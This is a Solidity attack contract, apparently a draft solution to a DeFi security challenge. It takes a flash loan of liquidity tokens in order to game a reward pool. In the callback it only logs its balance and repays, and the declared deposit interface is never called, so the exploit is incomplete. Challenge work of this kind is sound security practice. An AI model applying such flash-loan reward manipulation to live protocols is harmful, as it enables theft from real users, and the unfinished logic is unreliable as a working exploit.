// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/interfaces/IERC20.sol";

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;
}

contract RewardAttacker {

    IFlashLoanPool flashLoanPool;
    IRewarderPool rewarderPool;
    IERC20 liquidityToken;
    uint256 amount;
    constructor(
        address _flashLoanPool,
        address _rewarderPool,
        address _liquidityToken) {
        flashLoanPool = IFlashLoanPool(_flashLoanPool);
        rewarderPool = IRewarderPool(_rewarderPool);
        liquidityToken = IERC20(_liquidityToken);

    }

    function attackRewardPool(uint256 loanAmount) external {
        amount = loanAmount;
        console.log(amount);
        flashLoanPool.flashLoan(amount);
        amount = 0;
    }

    function receiveFlashLoan(uint256) external payable {
        uint256 myBalance = liquidityToken.balanceOf(address(this));
        console.log(myBalance);
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}
